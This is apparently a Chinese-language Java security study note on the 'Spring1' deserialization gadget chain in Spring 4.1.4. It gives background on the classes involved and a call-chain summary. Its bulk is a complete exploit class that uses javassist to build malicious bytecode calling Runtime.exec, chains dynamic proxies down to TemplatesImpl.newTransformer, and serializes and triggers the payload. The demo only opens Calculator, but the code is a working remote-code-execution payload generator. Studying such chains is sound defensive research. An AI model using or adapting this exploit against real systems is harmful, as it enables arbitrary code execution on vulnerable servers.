# Java安全学习—Spring1链

Author: H3rmesk1t

Data: 2022.03.12

# 环境配置
配置`pom.xml`文件, 添加如下依赖:

```xml
<dependencies>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-core</artifactId>
        <version>4.1.4.RELEASE</version>
    </dependency>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-beans</artifactId>
        <version>4.1.4.RELEASE</version>
    </dependency>
</dependencies>
```

# 前置知识
## MethodInvokeTypeProvider
在`Spring`核心包中存在一个内部类`org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider`, 这个类实现了`TypeProvider`接口, 是一个可以被反序列化的类.

看一下`readObject 方法`, 调用了`ReflectionUtils`先是`findMethod`返回`Method`对象然后紧接着调用`invokeMethod`反射调用, 需要注意的是, 这里的调用是无参调用. 由于`findMethod`是在`this.provider.getType().getClass()`进行中寻找, 所以如果在这里把`methodName`改为`newTransformer`方法, 然后把`this.provider.getType()`想办法处理成`TemplatesImpl`, 就可以利用`TemplatesImpl`来触发漏洞.

<div align=center><img src="./images/1.png"></div>

## ObjectFactoryDelegatingInvocationHandler
`org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler`是`InvocationHandler`的实现类, 实例化时接收一个`ObjectFactory`对象, 并在`invoke`代理时调用`ObjectFactory`的`getObject`方法返回`ObjectFactory`的实例用于`Method`的反射调用.

由于`ObjectFactory`的`getObject`方法返回的对象是泛型的, 因此可以用`AnnotationInvocationHandler`来代理, 返回任意对象. 而`ObjectFactoryDelegatingInvocationHandler`自己本身就是代理类, 可以用它代理之前的`TypeProvider`的`getType`方法.

<div align=center><img src="./images/2.png"></div>

## EXP
```java
package org.h3rmesk1t.Spring1;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/12 3:47 下午
 */
public class Spring1Exploit {

    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static Object templatesImpl() throws Exception {

        // 生成恶意的 bytecodes
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\");";
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("Spring1Exploit");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertBefore(cmd);
        byte[] ctClassBytes = ctClass.toBytecode();
        byte[][] targetByteCodes = new byte[][]{ctClassBytes};

        // 实例化类并设置属性
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_name", "h3rmesk1t");
        setFieldValue(templatesImpl, "_bytecodes", targetByteCodes);
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        return templatesImpl;
    }

    public static void main(String[] args) throws Exception {

        // 使用 AnnotationInvocationHandler 动态代理
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        HashMap<String, Object> map = new HashMap<>();
        map.put("getObject", templatesImpl());

        // 使用动态代理初始化 AnnotationInvocationHandler
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);

        // 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法, 使其返回 TemplatesImpl
        ObjectFactory<?> factory = (ObjectFactory<?>) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(), new Class[]{ObjectFactory.class}, invocationHandler);

        // ObjectFactoryDelegatingInvocationHandler 的 invoke 方法触发 ObjectFactory 的 getObject
        // 并且会调用 method.invoke(返回值, args)
        // 此时返回值被我们使用动态代理改为了 TemplatesImpl
        // 接下来需要 method 是 newTransformer(), 就可以触发调用链了
        Class<?> bClass = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
        Constructor<?> ofdConstructor = bClass.getDeclaredConstructors()[0];
        ofdConstructor.setAccessible(true);

        // 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler
        InvocationHandler ofdHandler = (InvocationHandler) ofdConstructor.newInstance(factory);

        // ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler
        // 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法
        // 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
        // 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值, 又可以在其中找到 newTransformer 方法
        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{Type.class, Templates.class}, ofdHandler);

        // 接下来代理  TypeProvider 的 getType() 方法, 使其返回我们创建的 typeTemplateProxy 代理类
        HashMap<String, Object> map2 = new HashMap<>();
        map2.put("getType", typeTemplateProxy);
        InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map2);

        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        // 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法, 使其返回 typeTemplateProxy
        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{typeProviderClass}, newInvocationHandler);


        // 初始化 MethodInvokeTypeProvider
        Class<?>       clazz2 = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Constructor<?> cons   = clazz2.getDeclaredConstructors()[0];
        cons.setAccessible(true);

        // 由于 MethodInvokeTypeProvider 初始化时会立即调用 ReflectionUtils.invokeMethod(method, provider.getType())
        // 所以初始化时我们随便给个 Method, methodName 我们使用反射写进去
        Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod("toString"), 0);
        Field  field   = clazz2.getDeclaredField("methodName");
        field.setAccessible(true);
        field.set(objects, "newTransformer");

        // 生成 exp
        String exp = serialize(objects);
        System.out.println(exp);
        // 触发 exp
        unserialize(exp);
    }
}
```

<div align=center><img src="./images/3.png"></div>

# 调用链

```java
SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()
    SerializableTypeWrapper.TypeProvider(Proxy).getType()
	    AnnotationInvocationHandler.invoke()
		    ReflectionUtils.invokeMethod()
			    Templates(Proxy).newTransformer()
				    AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()
					    ObjectFactory(Proxy).getObject()
						    TemplatesImpl.newTransformer()
```

# 总结
## 利用说明
多次动态代理, 利用动态代理的反射调用机制延长调用链, `Spring1`的链与`Groovy`有些类似.

## Gadget
 - kick-off gadget: org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider#readObject
 - sink gadget: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer
 - chain gadget: org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler#invoke